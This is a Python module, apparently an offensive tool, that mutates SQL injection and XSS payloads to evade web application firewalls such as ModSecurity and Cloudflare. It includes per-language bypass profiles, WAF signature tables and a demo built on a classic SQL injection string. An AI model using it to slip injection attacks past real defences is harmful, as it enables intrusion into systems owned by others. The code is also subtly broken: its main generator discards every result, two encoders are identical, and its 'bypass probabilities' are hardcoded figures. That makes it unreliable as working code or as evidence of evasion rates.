"""
Dynamic Payload Mutator
Generates variants of successful payloads with encoding bypasses and WAF evasion
Supports multiple mutation techniques targeting different security controls
"""

import base64
import urllib.parse
import html
import json
import re
import logging
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger("PayloadMutator")


class MutationStrategy(Enum):
    """Available payload mutation strategies"""
    BASE64_ENCODE = "base64_encode"
    HEX_ENCODE = "hex_encode"
    URL_ENCODE = "url_encode"
    DOUBLE_URL_ENCODE = "double_url_encode"
    HTML_ENTITY = "html_entity"
    UNICODE_ESCAPE = "unicode_escape"
    HEX_ESCAPE = "hex_escape"
    CHAR_SHUFFLE = "char_shuffle"
    COMMENT_INJECTION = "comment_injection"
    CASE_VARIATION = "case_variation"
    EQUIVALENT_OPERATORS = "equivalent_operators"
    WHITESPACE_VARIATION = "whitespace_variation"
    CONCATENATION = "concatenation"
    NESTED_ENCODING = "nested_encoding"
    UNICODE_NORMALIZATION = "unicode_normalization"


@dataclass
class MutatedPayload:
    """Result of a payload mutation"""
    original: str
    mutated: str
    strategy: MutationStrategy
    encoding_level: int  # How many layers of encoding
    estimated_bypass_probability: float  # 0.0-1.0
    target_waf: Optional[str] = None  # Specific WAF targeted
    technology_stack: Optional[str] = None  # PHP, Python, Java, etc.
    mutation_chain: List[str] = None  # Chain of mutations applied
    
    def __post_init__(self):
        if self.mutation_chain is None:
            self.mutation_chain = []


class PayloadMutator:
    """Generate WAF/IDS evasion variants of successful payloads"""
    
    # Technology-specific mutation profiles
    TECH_PROFILES = {
        'php': {
            'preferred_strategies': [
                MutationStrategy.HEX_ESCAPE,
                MutationStrategy.EQUIVALENT_OPERATORS,
                MutationStrategy.WHITESPACE_VARIATION,
                MutationStrategy.CONCATENATION,
            ],
            'operators': {
                'or': ['||', 'or'],
                'and': ['&&', 'and'],
                'not': ['!', 'not'],
            }
        },
        'python': {
            'preferred_strategies': [
                MutationStrategy.UNICODE_ESCAPE,
                MutationStrategy.HEX_ENCODE,
                MutationStrategy.CONCATENATION,
            ],
            'operators': {
                'or': [' or ', '|'],
                'and': [' and ', '&'],
                'not': [' not ', '!'],
            }
        },
        'java': {
            'preferred_strategies': [
                MutationStrategy.HEX_ENCODE,
                MutationStrategy.URL_ENCODE,
                MutationStrategy.UNICODE_ESCAPE,
            ],
            'string_methods': ['String.format', 'new String', 'StringBuilder']
        },
        'nodejs': {
            'preferred_strategies': [
                MutationStrategy.BASE64_ENCODE,
                MutationStrategy.WHITESPACE_VARIATION,
                MutationStrategy.CONCATENATION,
            ]
        },
        'asp.net': {
            'preferred_strategies': [
                MutationStrategy.HEX_ENCODE,
                MutationStrategy.DOUBLE_URL_ENCODE,
                MutationStrategy.WHITESPACE_VARIATION,
            ]
        }
    }
    
    # Common WAF filter patterns and bypass techniques
    WAF_PATTERNS = {
        'modsecurity': {
            'signatures': [r'union.*select', r'drop.*table', r'exec\(', r'system\('],
            'bypass_strategies': [
                MutationStrategy.COMMENT_INJECTION,
                MutationStrategy.WHITESPACE_VARIATION,
                MutationStrategy.CASE_VARIATION,
            ]
        },
        'cloudflare': {
            'signatures': [r'<script', r'javascript:', r'onerror=', r'onload='],
            'bypass_strategies': [
                MutationStrategy.HTML_ENTITY,
                MutationStrategy.DOUBLE_URL_ENCODE,
                MutationStrategy.UNICODE_NORMALIZATION,
            ]
        },
        'generic': {
            'signatures': [r'select', r'union', r'drop', r'insert', r'delete'],
            'bypass_strategies': [
                MutationStrategy.HEX_ENCODE,
                MutationStrategy.BASE64_ENCODE,
                MutationStrategy.CONCATENATION,
            ]
        }
    }
    
    def __init__(self):
        """Initialize mutator"""
        self.mutation_cache = {}
        logger.info("PayloadMutator initialized")
    
    def generate_mutations(
        self,
        payload: str,
        technology: Optional[str] = None,
        target_waf: Optional[str] = None,
        max_mutations: int = 10,
        encoding_depth: int = 2
    ) -> List[MutatedPayload]:
        """
        Generate payload mutations for WAF/IDS evasion
        
        Args:
            payload: Original payload to mutate
            technology: Target technology (php, python, java, etc.)
            target_waf: Specific WAF to target (modsecurity, cloudflare, etc.)
            max_mutations: Maximum number of variants to generate
            encoding_depth: Maximum encoding layers
        
        Returns:
            List of mutated payload variants
        """
        mutations = []
        
        # Select strategies based on technology and WAF
        strategies = self._select_strategies(technology, target_waf)
        
        # Generate mutations
        for strategy in strategies[:max_mutations]:
            mutated = self._apply_mutation(
                payload,
                strategy,
                technology,
                encoding_depth
            )
            
            if mutated and mutated.original != payload:
                mutations.append(mutated)
        
        logger.debug(f"Generated {len(mutations)} mutations for payload")
        return mutations
    
    def _select_strategies(
        self,
        technology: Optional[str],
        target_waf: Optional[str]
    ) -> List[MutationStrategy]:
        """Select optimal mutation strategies"""
        strategies = []
        
        # Add technology-specific strategies
        if technology and technology.lower() in self.TECH_PROFILES:
            strategies.extend(
                self.TECH_PROFILES[technology.lower()]['preferred_strategies']
            )
        
        # Add WAF-specific strategies
        if target_waf and target_waf.lower() in self.WAF_PATTERNS:
            strategies.extend(
                self.WAF_PATTERNS[target_waf.lower()]['bypass_strategies']
            )
        
        # Add generic strategies if not enough
        if len(strategies) < 5:
            strategies.extend([
                MutationStrategy.HEX_ENCODE,
                MutationStrategy.BASE64_ENCODE,
                MutationStrategy.URL_ENCODE,
                MutationStrategy.CONCATENATION,
                MutationStrategy.WHITESPACE_VARIATION,
            ])
        
        # Remove duplicates while preserving order
        seen = set()
        unique_strategies = []
        for s in strategies:
            if s not in seen:
                unique_strategies.append(s)
                seen.add(s)
        
        return unique_strategies
    
    def _apply_mutation(
        self,
        payload: str,
        strategy: MutationStrategy,
        technology: Optional[str],
        max_depth: int
    ) -> Optional[MutatedPayload]:
        """Apply a specific mutation strategy"""
        try:
            mutated = payload
            mutation_chain = []
            bypass_prob = 0.6  # Base probability
            
            if strategy == MutationStrategy.BASE64_ENCODE:
                mutated = self._encode_base64(payload)
                mutation_chain.append("base64")
                bypass_prob = 0.7
            
            elif strategy == MutationStrategy.HEX_ENCODE:
                mutated = self._encode_hex(payload)
                mutation_chain.append("hex")
                bypass_prob = 0.75
            
            elif strategy == MutationStrategy.URL_ENCODE:
                mutated = urllib.parse.quote(payload, safe='')
                mutation_chain.append("url_encode")
                bypass_prob = 0.65
            
            elif strategy == MutationStrategy.DOUBLE_URL_ENCODE:
                mutated = urllib.parse.quote(
                    urllib.parse.quote(payload, safe=''),
                    safe=''
                )
                mutation_chain.append("double_url_encode")
                bypass_prob = 0.55
            
            elif strategy == MutationStrategy.HTML_ENTITY:
                mutated = self._encode_html_entities(payload)
                mutation_chain.append("html_entity")
                bypass_prob = 0.72
            
            elif strategy == MutationStrategy.UNICODE_ESCAPE:
                mutated = self._encode_unicode(payload)
                mutation_chain.append("unicode_escape")
                bypass_prob = 0.68
            
            elif strategy == MutationStrategy.HEX_ESCAPE:
                mutated = self._hex_escape(payload)
                mutation_chain.append("hex_escape")
                bypass_prob = 0.70
            
            elif strategy == MutationStrategy.COMMENT_INJECTION:
                mutated = self._inject_comments(payload)
                mutation_chain.append("comment_injection")
                bypass_prob = 0.55
            
            elif strategy == MutationStrategy.CASE_VARIATION:
                mutated = self._vary_case(payload)
                mutation_chain.append("case_variation")
                bypass_prob = 0.40
            
            elif strategy == MutationStrategy.EQUIVALENT_OPERATORS:
                mutated = self._equivalent_operators(payload, technology)
                mutation_chain.append("equivalent_operators")
                bypass_prob = 0.65
            
            elif strategy == MutationStrategy.WHITESPACE_VARIATION:
                mutated = self._vary_whitespace(payload)
                mutation_chain.append("whitespace_variation")
                bypass_prob = 0.50
            
            elif strategy == MutationStrategy.CONCATENATION:
                mutated = self._concatenate_strings(payload, technology)
                mutation_chain.append("concatenation")
                bypass_prob = 0.62
            
            elif strategy == MutationStrategy.NESTED_ENCODING:
                mutated = self._nested_encoding(payload, max_depth)
                mutation_chain.extend(["nested"] + mutation_chain[:max_depth-1])
                bypass_prob = 0.78
            
            elif strategy == MutationStrategy.UNICODE_NORMALIZATION:
                mutated = self._unicode_normalize(payload)
                mutation_chain.append("unicode_normalize")
                bypass_prob = 0.52
            
            return MutatedPayload(
                original=payload,
                mutated=mutated,
                strategy=strategy,
                encoding_level=len(mutation_chain),
                estimated_bypass_probability=bypass_prob,
                technology_stack=technology,
                mutation_chain=mutation_chain
            )
        
        except Exception as e:
            logger.debug(f"Mutation failed ({strategy.value}): {e}")
            return None
    
    # Encoding methods
    
    def _encode_base64(self, payload: str) -> str:
        """Encode payload as base64"""
        return base64.b64encode(payload.encode()).decode()
    
    def _encode_hex(self, payload: str) -> str:
        """Convert payload to hex representation"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def _encode_html_entities(self, payload: str) -> str:
        """Encode as HTML entities"""
        return ''.join(
            f'&#{ord(c)};' if ord(c) > 127 else c
            for c in payload
        )
    
    def _encode_unicode(self, payload: str) -> str:
        """Encode as Unicode escapes"""
        return ''.join(
            f'\\u{ord(c):04x}' if ord(c) > 127 else c
            for c in payload
        )
    
    def _hex_escape(self, payload: str) -> str:
        """Hex escape payload for PHP/bash"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def _inject_comments(self, payload: str) -> str:
        """Inject SQL/programming comments to evade regex"""
        # SQL style
        if any(kw in payload.lower() for kw in ['select', 'union', 'drop']):
            return payload.replace('SELECT', 'SE/**/LECT').replace(
                'UNION', 'UN/**/ION'
            )
        return payload
    
    def _vary_case(self, payload: str) -> str:
        """Vary case of SQL keywords"""
        keywords = ['SELECT', 'UNION', 'DROP', 'DELETE', 'INSERT', 'UPDATE']
        mutated = payload
        for kw in keywords:
            if kw.lower() in payload.lower():
                import random
                var = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in kw
                )
                mutated = re.sub(kw, var, mutated, flags=re.IGNORECASE)
        return mutated
    
    def _equivalent_operators(self, payload: str, technology: Optional[str]) -> str:
        """Replace operators with equivalents"""
        if not technology:
            technology = 'php'
        
        profile = self.TECH_PROFILES.get(technology.lower(), {})
        operators = profile.get('operators', {})
        
        mutated = payload
        for op, variants in operators.items():
            if len(variants) > 1:
                mutated = mutated.replace(variants[0], variants[1])
        
        return mutated
    
    def _vary_whitespace(self, payload: str) -> str:
        """Vary whitespace to evade regex"""
        # Replace spaces around keywords
        keywords = ['OR', 'AND', 'NOT', 'SELECT', 'UNION']
        mutated = payload
        for kw in keywords:
            if kw in payload:
                mutated = mutated.replace(
                    f' {kw} ',
                    f'  {kw}  '  # Add extra space
                )
        return mutated
    
    def _concatenate_strings(self, payload: str, technology: Optional[str]) -> str:
        """Split payload into concatenated strings"""
        if not technology:
            technology = 'php'
        
        tech_lower = technology.lower()
        
        if 'php' in tech_lower:
            # PHP concatenation with .
            parts = [payload[i:i+5] for i in range(0, len(payload), 5)]
            return " . ".join(f"'{p}'" for p in parts)
        
        elif 'python' in tech_lower:
            # Python concatenation with +
            parts = [payload[i:i+5] for i in range(0, len(payload), 5)]
            return " + ".join(f"'{p}'" for p in parts)
        
        elif 'java' in tech_lower:
            # Java concatenation
            parts = [payload[i:i+5] for i in range(0, len(payload), 5)]
            return " + ".join(f"\"{p}\"" for p in parts)
        
        return payload
    
    def _nested_encoding(self, payload: str, max_depth: int) -> str:
        """Apply multiple layers of encoding"""
        mutated = payload
        for _ in range(min(max_depth, 2)):
            mutated = self._encode_base64(mutated)
        return mutated
    
    def _unicode_normalize(self, payload: str) -> str:
        """Unicode normalization to bypass filters"""
        import unicodedata
        try:
            # NFD normalization can bypass some filters
            return unicodedata.normalize('NFD', payload)
        except:
            return payload
    
    # Utility methods
    
    def rank_mutations(
        self,
        mutations: List[MutatedPayload],
        target_waf: Optional[str] = None
    ) -> List[Tuple[MutatedPayload, float]]:
        """
        Rank mutations by effectiveness against target WAF
        
        Returns:
            List of (mutation, score) tuples sorted by score
        """
        scored = []
        
        for mutation in mutations:
            score = mutation.estimated_bypass_probability
            
            # Boost score if targeting specific WAF
            if target_waf:
                waf_lower = target_waf.lower()
                if waf_lower in self.WAF_PATTERNS:
                    if mutation.strategy in self.WAF_PATTERNS[waf_lower]['bypass_strategies']:
                        score += 0.15
            
            # Penalize very high encoding levels (may break functionality)
            if mutation.encoding_level > 3:
                score -= 0.1
            
            scored.append((mutation, score))
        
        # Sort by score descending
        return sorted(scored, key=lambda x: x[1], reverse=True)
    
    def get_mutation_summary(self, mutations: List[MutatedPayload]) -> Dict:
        """Get summary statistics of mutations"""
        if not mutations:
            return {}
        
        strategies_used = {}
        avg_bypass_prob = sum(m.estimated_bypass_probability for m in mutations) / len(mutations)
        max_encoding_level = max(m.encoding_level for m in mutations)
        
        for mutation in mutations:
            strategy = mutation.strategy.value
            strategies_used[strategy] = strategies_used.get(strategy, 0) + 1
        
        return {
            'total_mutations': len(mutations),
            'strategies_used': strategies_used,
            'average_bypass_probability': avg_bypass_prob,
            'max_encoding_level': max_encoding_level,
            'estimated_waf_evasion_rate': avg_bypass_prob
        }


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    mutator = PayloadMutator()
    
    # Test basic SQL injection payload
    sql_payload = "' OR '1'='1' --"
    print(f"Original payload: {sql_payload}\n")
    
    # PHP-targeted mutations
    print("=== PHP Target ===")
    php_mutations = mutator.generate_mutations(
        sql_payload,
        technology='php',
        max_mutations=5
    )
    
    for mut in php_mutations:
        print(f"Strategy: {mut.strategy.value}")
        print(f"Mutated: {mut.mutated[:50]}...")
        print(f"Bypass Probability: {mut.estimated_bypass_probability:.2f}\n")
    
    # Rank mutations
    print("\n=== Ranked Mutations ===")
    ranked = mutator.rank_mutations(php_mutations, target_waf='modsecurity')
    for mut, score in ranked[:3]:
        print(f"Score: {score:.2f} | Strategy: {mut.strategy.value}")
    
    # Summary
    summary = mutator.get_mutation_summary(php_mutations)
    print(f"\nSummary: {summary}")
